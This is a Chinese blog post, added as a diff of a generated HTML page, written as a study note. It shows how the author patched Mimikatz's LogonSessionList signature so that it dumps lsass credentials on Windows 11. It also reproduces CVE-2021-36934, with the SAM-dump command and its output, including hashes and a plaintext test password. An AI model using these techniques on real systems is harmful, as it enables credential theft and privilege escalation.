@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/df32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/df16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"dreamfo1l.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="sekurlsa模块无法正常抓取密码哈希，报错如图">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mimikatz在Windows 11上运行的问题">
+<meta property="og:url" content="https://dreamfo1l.github.io/2021/09/06/Mimikatz/index.html">
+<meta property="og:site_name" content="dreamfoil">
+<meta property="og:description" content="sekurlsa模块无法正常抓取密码哈希，报错如图">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727163838089.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727102159296.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727105228295.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727131002320.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727131347704.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727133236994.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727133542149.png">
+<meta property="article:published_time" content="2021-09-06T13:12:10.000Z">
+<meta property="article:modified_time" content="2021-10-02T09:05:44.000Z">
+<meta property="article:author" content="dreamfoil">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727163838089.png">
+
+<link rel="canonical" href="https://dreamfo1l.github.io/2021/09/06/Mimikatz/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Mimikatz在Windows 11上运行的问题 | dreamfoil</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">dreamfoil</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://dreamfo1l.github.io/2021/09/06/Mimikatz/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="dreamfoil">
+      <meta itemprop="description" content="独立之精神，自由之思想。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dreamfoil">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Mimikatz在Windows 11上运行的问题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-09-06 21:12:10" itemprop="dateCreated datePublished" datetime="2021-09-06T21:12:10+08:00">2021-09-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-02 17:05:44" itemprop="dateModified" datetime="2021-10-02T17:05:44+08:00">2021-10-02</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>sekurlsa</strong>模块无法正常抓取密码哈希，报错如图</p>
+<p><img src="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727163838089.png" alt="image-20210727163838089"></p>
+<span id="more"></span>
+
+<h3 id="猜测产生问题的原因"><a href="#猜测产生问题的原因" class="headerlink" title="猜测产生问题的原因"></a>猜测产生问题的原因</h3><h4 id="1-admin权限无法直接从lsass-exe进程内存中直接获取密码哈希"><a href="#1-admin权限无法直接从lsass-exe进程内存中直接获取密码哈希" class="headerlink" title="1. admin权限无法直接从lsass.exe进程内存中直接获取密码哈希"></a>1. admin权限无法直接从lsass.exe进程内存中直接获取密码哈希</h4><p><strong>尝试解决方法：</strong></p>
+<p>1.将进程内存dump下来，然后再使用mimikatz分析dmp文件</p>
+<p>2.提升权限至<em>trustedinstaller</em>再执行 <code>sekurlsa::logonpasswords</code> </p>
+<p>两种方法试了很多次都会报错，在尝试解决的中，发现在windows 11中dump出的进程内存，在windows 10上也无法分析，所以应该是方向错了。这里大概率是无法正确寻址到存储密码的内存地址。</p>
+<h4 id="2-Mimikatz对lsass进程的解析过程的问题"><a href="#2-Mimikatz对lsass进程的解析过程的问题" class="headerlink" title="2. Mimikatz对lsass进程的解析过程的问题"></a>2. Mimikatz对lsass进程的解析过程的问题</h4><h5 id="sekurlsa模块的原理"><a href="#sekurlsa模块的原理" class="headerlink" title="sekurlsa模块的原理"></a><strong>sekurlsa</strong>模块的原理</h5><ol>
+<li><p>读取LSASS.exe进程中LSASRV.dll模块的内存</p>
+</li>
+<li><p>找到LSASRV.dll中的两个全局变量<code>LogonSessionList</code>和<code>LogonSessionListCount</code>这两结构用于存储当前活动的 Windows 登录会话列表</p>
+<p><strong>Mimikatz寻找两个结构的方法：</strong>由于都是全局变量，可以采取启发式方法来识别引用这些全局变量的指令。这些指令通过<strong>rip</strong>相对寻址来访问与使用全局变量。还需要保存两个全局变量相对特征码的偏移</p>
+</li>
+</ol>
+<h5 id="IDA分析Lsasrv-dll"><a href="#IDA分析Lsasrv-dll" class="headerlink" title="IDA分析Lsasrv.dll"></a>IDA分析Lsasrv.dll</h5><p>找到这两个全局变量，将中间不变的机器码当做内存特征。</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727102159296.png" alt="image-20210727102159296"></h4><h5 id="mimikatz源码中存储特征码的结构"><a href="#mimikatz源码中存储特征码的结构" class="headerlink" title="mimikatz源码中存储特征码的结构"></a>mimikatz源码中存储特征码的结构</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(_M_X64)</span></span><br><span class="line">BYTE PTRN_WIN5_LogonSessionList[]	= &#123;<span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0xdf</span>, <span class="number">0x49</span>, <span class="number">0xc1</span>, <span class="number">0xe3</span>, <span class="number">0x04</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xcb</span>, <span class="number">0x4c</span>, <span class="number">0x03</span>, <span class="number">0xd8</span>&#125;;</span><br><span class="line">BYTE PTRN_WN60_LogonSessionList[]	= &#123;<span class="number">0x33</span>, <span class="number">0xff</span>, <span class="number">0x45</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x41</span>, <span class="number">0x89</span>, <span class="number">0x75</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0xe3</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>&#125;;</span><br><span class="line">BYTE PTRN_WN61_LogonSessionList[]	= &#123;<span class="number">0x33</span>, <span class="number">0xf6</span>, <span class="number">0x45</span>, <span class="number">0x89</span>, <span class="number">0x2f</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0xf3</span>, <span class="number">0x85</span>, <span class="number">0xff</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>&#125;;</span><br><span class="line">BYTE PTRN_WN63_LogonSessionList[]	= &#123;<span class="number">0x8b</span>, <span class="number">0xde</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x0c</span>, <span class="number">0x5b</span>, <span class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xe1</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x05</span>&#125;;</span><br><span class="line">BYTE PTRN_WN6x_LogonSessionList[]	= &#123;<span class="number">0x33</span>, <span class="number">0xff</span>, <span class="number">0x41</span>, <span class="number">0x89</span>, <span class="number">0x37</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0xf3</span>, <span class="number">0x45</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>&#125;;</span><br><span class="line">BYTE PTRN_WN1703_LogonSessionList[]	= &#123;<span class="number">0x33</span>, <span class="number">0xff</span>, <span class="number">0x45</span>, <span class="number">0x89</span>, <span class="number">0x37</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xf3</span>, <span class="number">0x45</span>, <span class="number">0x85</span>, <span class="number">0xc9</span>, <span class="number">0x74</span>&#125;;</span><br><span class="line">BYTE PTRN_WN1803_LogonSessionList[] = &#123;<span class="number">0x33</span>, <span class="number">0xff</span>, <span class="number">0x41</span>, <span class="number">0x89</span>, <span class="number">0x37</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0xf3</span>, <span class="number">0x45</span>, <span class="number">0x85</span>, <span class="number">0xc9</span>, <span class="number">0x74</span>&#125;;</span><br><span class="line"></span><br><span class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</span><br><span class="line">	&#123;KULL_M_WIN_BUILD_XP,		&#123;<span class="keyword">sizeof</span>(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList&#125;,	&#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;, &#123;<span class="number">-4</span>,   <span class="number">0</span>&#125;&#125;,</span><br><span class="line">	&#123;KULL_M_WIN_BUILD_2K3,		&#123;<span class="keyword">sizeof</span>(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList&#125;,	&#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;, &#123;<span class="number">-4</span>, <span class="number">-45</span>&#125;&#125;,</span><br><span class="line">	&#123;KULL_M_WIN_BUILD_VISTA,	&#123;<span class="keyword">sizeof</span>(PTRN_WN60_LogonSessionList),	PTRN_WN60_LogonSessionList&#125;,	&#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;, &#123;<span class="number">21</span>,  <span class="number">-4</span>&#125;&#125;,</span><br><span class="line">	&#123;KULL_M_WIN_BUILD_7,		&#123;<span class="keyword">sizeof</span>(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList&#125;,	&#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;, &#123;<span class="number">19</span>,  <span class="number">-4</span>&#125;&#125;,</span><br><span class="line">	&#123;KULL_M_WIN_BUILD_8,		&#123;<span class="keyword">sizeof</span>(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList&#125;,	&#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;, &#123;<span class="number">16</span>,  <span class="number">-4</span>&#125;&#125;,</span><br><span class="line">	&#123;KULL_M_WIN_BUILD_BLUE,		&#123;<span class="keyword">sizeof</span>(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList&#125;,	&#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;, &#123;<span class="number">36</span>,  <span class="number">-6</span>&#125;&#125;,</span><br><span class="line">	&#123;KULL_M_WIN_BUILD_10_1507,	&#123;<span class="keyword">sizeof</span>(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList&#125;,	&#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;, &#123;<span class="number">16</span>,  <span class="number">-4</span>&#125;&#125;,</span><br><span class="line">	&#123;KULL_M_WIN_BUILD_10_1703,	&#123;<span class="keyword">sizeof</span>(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList&#125;,	&#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;, &#123;<span class="number">23</span>,  <span class="number">-4</span>&#125;&#125;,</span><br><span class="line">	&#123;KULL_M_WIN_BUILD_10_1803,	&#123;<span class="keyword">sizeof</span>(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList&#125;,	&#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;, &#123;<span class="number">23</span>,  <span class="number">-4</span>&#125;&#125;,</span><br><span class="line">	&#123;KULL_M_WIN_BUILD_10_1903,	&#123;<span class="keyword">sizeof</span>(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList&#125;,	&#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;, &#123;<span class="number">23</span>,  <span class="number">-4</span>&#125;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>确定特征码如图</p>
+<p><img src="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727105228295.png" alt="image-20210727105228295"></p>
+<p>分别添加下面两项：</p>
+<p><code>BYTE PTRN_new_LogonSessionList[]    = &#123;0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74&#125;;</code></p>
+<p><code>&#123;KULL_M_WIN_BUILD_11,       &#123;sizeof(PTRN_new_LogonSessionList),     PTRN_new_LogonSessionList&#125;,     &#123;0, NULL&#125;, &#123;24,  -4&#125;&#125;,</code></p>
+<p>这里 24和-4 是指从特征码起始地址到 <strong>偏移的地址</strong>的偏移</p>
+<h5 id="修改源码后编译运行"><a href="#修改源码后编译运行" class="headerlink" title="修改源码后编译运行"></a>修改源码后编译运行</h5><p><img src="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727131002320.png" alt="image-20210727131002320"></p>
+<p><strong>验证NTLM</strong> <strong>hash</strong></p>
+<p><img src="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727131347704.png" alt="image-20210727131347704"></p>
+<p>！</p>
+<h3 id="cve-2021-36934"><a href="#cve-2021-36934" class="headerlink" title="cve-2021-36934"></a>cve-2021-36934</h3><p>在解决问题的过程中，我在翻阅mimikatz作者的最近的推特，想看看他有没有在windows 11上运行mimikatz，可能会给我一些提示。发现他在<strong>windows 11</strong> 用<strong>mimikatz</strong>上复现了最新的提权漏洞，展示了对SAM文件的访问，获取NTML hash。</p>
+<p>学习一下</p>
+<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>由于对多个系统文件（包括安全帐户管理器 (SAM) 数据库）的访问控制列表 (ACL) 过于宽松，因此存在特权提升漏洞，成功利用此漏洞可以将普通用户权限提升至SYSTEM权限并在目标机器上执行任意代码。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="前提：开启VSS卷影复制服务（默认开启）"><a href="#前提：开启VSS卷影复制服务（默认开启）" class="headerlink" title="前提：开启VSS卷影复制服务（默认开启）"></a>前提：开启VSS卷影复制服务（默认开启）</h5><p><img src="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727133236994.png" alt="image-20210727133236994"></p>
+<p><img src="https://raw.githubusercontent.com/dreamfo1l/blogImages/master/image-20210727133542149.png" alt="image-20210727133542149"></p>
+<p><code>lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM</code></p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM</span><br><span class="line"><span class="attribute">Domain</span><span class="punctuation"> :</span> <span class="string">DESKTOP-O964ESB</span></span><br><span class="line"><span class="attribute">SysKey</span><span class="punctuation"> :</span> <span class="string">a08925cd5aa1e233979b6e7f5af5d14f</span></span><br><span class="line"><span class="attribute">Local SID</span><span class="punctuation"> :</span> <span class="string">S-1-5-21-4122028251-988587905-1313519337</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">SAMKey</span><span class="punctuation"> :</span> <span class="string">370726e6ff65705806c59ecab7215638</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">RID</span><span class="punctuation">  :</span> <span class="string">000001f4 (500)</span></span><br><span class="line"><span class="attribute">User</span><span class="punctuation"> :</span> <span class="string">Administrator</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">RID</span><span class="punctuation">  :</span> <span class="string">000001f5 (501)</span></span><br><span class="line"><span class="attribute">User</span><span class="punctuation"> :</span> <span class="string">Guest</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">RID</span><span class="punctuation">  :</span> <span class="string">000001f7 (503)</span></span><br><span class="line"><span class="attribute">User</span><span class="punctuation"> :</span> <span class="string">DefaultAccount</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">RID</span><span class="punctuation">  :</span> <span class="string">000001f8 (504)</span></span><br><span class="line"><span class="attribute">User</span><span class="punctuation"> :</span> <span class="string">WDAGUtilityAccount</span></span><br><span class="line">  <span class="attribute">Hash NTLM</span><span class="punctuation">:</span> <span class="string">87b648d8bcebb806071d6e82ce8cb702</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Supplemental Credentials</span><span class="punctuation">:</span></span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    <span class="attribute">Random Value</span><span class="punctuation"> :</span> <span class="string">1716c9242888029acdb319d523057c8c</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    <span class="attribute">Default Salt</span><span class="punctuation"> :</span> <span class="string">WDAGUtilityAccount</span></span><br><span class="line">    <span class="attribute">Default Iterations</span><span class="punctuation"> :</span> <span class="string">4096</span></span><br><span class="line">    <span class="attribute">Credentials</span></span><br><span class="line"><span class="attribute">      aes256_hmac       (4096)</span><span class="punctuation"> :</span> <span class="string">8bae3cca0f8f0fc6883d1ef4184700faa12ebe2be3d3cd98779f56e1de369b65</span></span><br><span class="line">      <span class="attribute">aes128_hmac       (4096)</span><span class="punctuation"> :</span> <span class="string">47cbc90d91a18441576f0e9c11b5fed6</span></span><br><span class="line">      <span class="attribute">des_cbc_md5       (4096)</span><span class="punctuation"> :</span> <span class="string">54078fdaa82cba8a</span></span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    <span class="attribute">Default Salt</span><span class="punctuation"> :</span> <span class="string">WDAGUtilityAccount</span></span><br><span class="line">    <span class="attribute">Credentials</span></span><br><span class="line"><span class="attribute">      des_cbc_md5</span><span class="punctuation">       :</span> <span class="string">54078fdaa82cba8a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">RID</span><span class="punctuation">  :</span> <span class="string">000003e9 (1001)</span></span><br><span class="line"><span class="attribute">User</span><span class="punctuation"> :</span> <span class="string">dreamfoil</span></span><br><span class="line">  <span class="attribute">Hash NTLM</span><span class="punctuation">:</span> <span class="string">e66e908cc621a6280bab324adc1a1452</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Supplemental Credentials</span><span class="punctuation">:</span></span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    <span class="attribute">Random Value</span><span class="punctuation"> :</span> <span class="string">bca168626d56ba0130bda5e9bf879d1d</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    <span class="attribute">Default Salt</span><span class="punctuation"> :</span> <span class="string">DESKTOP-O964ESBdreamfoil</span></span><br><span class="line">    <span class="attribute">Default Iterations</span><span class="punctuation"> :</span> <span class="string">4096</span></span><br><span class="line">    <span class="attribute">Credentials</span></span><br><span class="line"><span class="attribute">      aes256_hmac       (4096)</span><span class="punctuation"> :</span> <span class="string">fb36afea63165610fcd2d6a791b7277d40475343e47cf317e9ed83f23b131731</span></span><br><span class="line">      <span class="attribute">aes128_hmac       (4096)</span><span class="punctuation"> :</span> <span class="string">6a2fe2310337386317b6ddf529bbd20e</span></span><br><span class="line">      <span class="attribute">des_cbc_md5       (4096)</span><span class="punctuation"> :</span> <span class="string">c28fda1076e5cd83</span></span><br><span class="line">    <span class="attribute">OldCredentials</span></span><br><span class="line"><span class="attribute">      aes256_hmac       (4096)</span><span class="punctuation"> :</span> <span class="string">fb36afea63165610fcd2d6a791b7277d40475343e47cf317e9ed83f23b131731</span></span><br><span class="line">      <span class="attribute">aes128_hmac       (4096)</span><span class="punctuation"> :</span> <span class="string">6a2fe2310337386317b6ddf529bbd20e</span></span><br><span class="line">      <span class="attribute">des_cbc_md5       (4096)</span><span class="punctuation"> :</span> <span class="string">c28fda1076e5cd83</span></span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    <span class="attribute">Default Salt</span><span class="punctuation"> :</span> <span class="string">DESKTOP-O964ESBdreamfoil</span></span><br><span class="line">    <span class="attribute">Credentials</span></span><br><span class="line"><span class="attribute">      des_cbc_md5</span><span class="punctuation">       :</span> <span class="string">c28fda1076e5cd83</span></span><br><span class="line">    <span class="attribute">OldCredentials</span></span><br><span class="line"><span class="attribute">      des_cbc_md5</span><span class="punctuation">       :</span> <span class="string">c28fda1076e5cd83</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # crypto::hash /password:295714 /u</span><br><span class="line"><span class="attribute">NTLM</span><span class="punctuation">:</span> <span class="string">e66e908cc621a6280bab324adc1a1452</span></span><br><span class="line"><span class="attribute">LM</span><span class="punctuation">  :</span> <span class="string">47bf08a501fa37beaad3b435b51404ee</span></span><br><span class="line"><span class="attribute">MD5</span><span class="punctuation"> :</span> <span class="string">11be67779d74644218766a3d8bb3a3fb</span></span><br><span class="line"><span class="attribute">SHA1</span><span class="punctuation">:</span> <span class="string">cc3f62561ae21216ab14c585b40e417252224e88</span></span><br><span class="line"><span class="attribute">SHA2</span><span class="punctuation">:</span> <span class="string">59b0a666782b8c5281204e828b5ab62f1f61bfd79881c8da8066195c314cf610</span></span><br></pre></td></tr></table></figure>
+
+<p>成功读取SAM文件</p>
+<h4 id="漏洞影响版本及缓解手段"><a href="#漏洞影响版本及缓解手段" class="headerlink" title="漏洞影响版本及缓解手段"></a>漏洞影响版本及缓解手段</h4><p>windows10 1809之后的版本</p>
+<p><strong>缓解手段</strong>：删除VSS副本</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/10/Pointer%20Analysis%20Foundations/" rel="prev" title="Pointer Analysis Foundations">
+      <i class="fa fa-chevron-left"></i> Pointer Analysis Foundations
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
